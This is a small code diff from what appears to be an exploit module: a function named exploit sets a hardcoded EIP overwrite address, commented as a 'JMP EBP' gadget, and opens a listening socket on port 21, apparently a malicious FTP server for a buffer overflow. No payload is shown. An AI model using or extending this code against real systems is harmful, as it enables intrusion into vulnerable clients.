@@ -27,7 +27,7 @@ metadata = {
     ]}
 
 def exploit(args):
-    target_eip = "\x33\x14\x26\x76"
+    target_eip = "\x33\x14\x26\x76" #FF E5 ;JMP EBP
     s0ck3t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s0ck3t.bind(("0.0.0.0", 21))
     s0ck3t.listen(5)
